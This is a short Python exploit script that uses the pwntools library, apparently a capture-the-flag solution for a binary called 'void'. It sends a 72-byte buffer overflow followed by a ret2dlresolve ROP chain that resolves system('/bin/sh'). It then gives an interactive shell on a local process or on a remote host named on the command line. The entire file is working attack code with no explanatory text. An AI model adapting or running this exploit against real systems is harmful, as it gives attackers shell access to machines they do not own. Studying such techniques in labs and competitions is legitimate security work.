#!/usr/bin/env python3

from pwn import *

context.binary = 'void'

rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(context.binary, symbol='system', args=['/bin/sh\0'])
rop.read(0, dlresolve.data_addr)
rop.raw(rop.ret[0])
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()

if len(sys.argv) == 1:
    p = context.binary.process()
else:
    host, port = sys.argv[1].split(':')
    p = remote(host, port)

p.sendline(b'A' * 72 + raw_rop)
p.sendline(dlresolve.payload)
p.interactive()
